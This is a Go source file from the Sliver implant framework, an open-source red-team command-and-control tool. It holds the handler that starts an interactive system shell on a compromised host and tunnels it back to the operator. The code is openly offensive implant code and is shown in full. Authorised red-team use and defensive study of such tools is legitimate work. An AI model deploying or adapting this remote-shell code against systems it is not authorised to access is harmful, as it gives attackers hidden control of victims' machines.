package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"io"
	"sync"

	"github.com/bishopfox/sliver/implant/sliver/shell"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	shellReq := &sliverpb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
		// {{end}}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	rows := shellReq.GetRows()
	cols := shellReq.GetCols()
	if rows > 0xffff {
		rows = 0xffff
	}
	if cols > 0xffff {
		cols = 0xffff
	}
	systemShell, err := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY, uint16(rows), uint16(cols))
	if err != nil || systemShell == nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to spawn system shell: %v", err)
		// {{end}}
		errMessage := "failed to start system shell"
		if err != nil {
			errMessage = err.Error()
		}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: errMessage,
			},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	// {{if .Config.Debug}}
	log.Printf("[shell] Process spawned!")
	// {{end}}

	tunnel := transports.NewTunnel(
		shellReq.TunnelID,
		systemShell.Stdin,
		systemShell.Stdout,
		systemShell.Stderr,
	)
	session := shell.NewSession(systemShell)
	if !connection.AddTunnel(tunnel) {
		session.Stop()
		tunnel.Close()
		_ = systemShell.Wait()
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{Err: "shell tunnel ID is already active"},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	if !shell.RegisterSession(tunnel.ID, session) {
		// Tunnel handlers are dispatched concurrently. A close can overtake this
		// request while the process is starting; in that case registration stops
		// the process and declines to publish a shell that can no longer be closed.
		connection.CloseTunnelRemote(tunnel)
		_ = systemShell.Wait()
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{Err: "shell tunnel closed during startup"},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	// Queue the start response before any output goroutine can enqueue tunnel
	// data. Fast shells must not race their own start acknowledgement.
	shellResp, _ := proto.Marshal(&sliverpb.Shell{
		Pid:      uint32(systemShell.Command.Process.Pid),
		Path:     shellReq.Path,
		TunnelID: shellReq.TunnelID,
	})
	if !connection.SendEnvelope(&sliverpb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}) {
		shell.UnregisterSession(tunnel.ID)
		session.Stop()
		connection.CloseTunnelRemote(tunnel)
		_ = systemShell.Wait()
		return
	}

	var finalizeOnce sync.Once
	finalize := func(reason string, err error) {
		finalizeOnce.Do(func() {
			// {{if .Config.Debug}}
			log.Printf("[shell] Closing tunnel request %d (%s). Err: %v", tunnel.ID, reason, err)
			// {{end}}

			shell.UnregisterSession(tunnel.ID)
			connection.CloseTunnelLocal(tunnel)
		})
	}

	var readers sync.WaitGroup
	for _, rc := range tunnel.Readers {
		if rc == nil {
			continue
		}
		readers.Add(1)
		go func(outErr io.ReadCloser) {
			defer readers.Done()
			tWriter := tunnelWriter{
				conn: connection,
				tun:  tunnel,
			}
			// {{if .Config.Debug}}
			log.Printf("[shell] tWriter: %v outErr: %v", tWriter, outErr)
			// {{end}}
			_, err := io.Copy(tWriter, outErr)

			if err != nil && err != io.EOF {
				// An output-pipe failure would otherwise leave Wait blocked on a
				// still-running process. One stop request terminates all readers.
				session.Stop()
			}
		}(rc)
	}

	// Exactly one goroutine owns Cmd.Wait. It first drains every output pipe,
	// which avoids both concurrent-Wait failures and pipe-buffer deadlocks. The
	// shell response is queued first so a fast-exiting process cannot close the
	// tunnel before its start acknowledgement reaches the server.
	go func() {
		readers.Wait()
		waitErr := systemShell.Wait()
		session.Stop()
		finalize("process exit", waitErr)
	}()

	// {{if .Config.Debug}}
	log.Printf("[shell] Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}
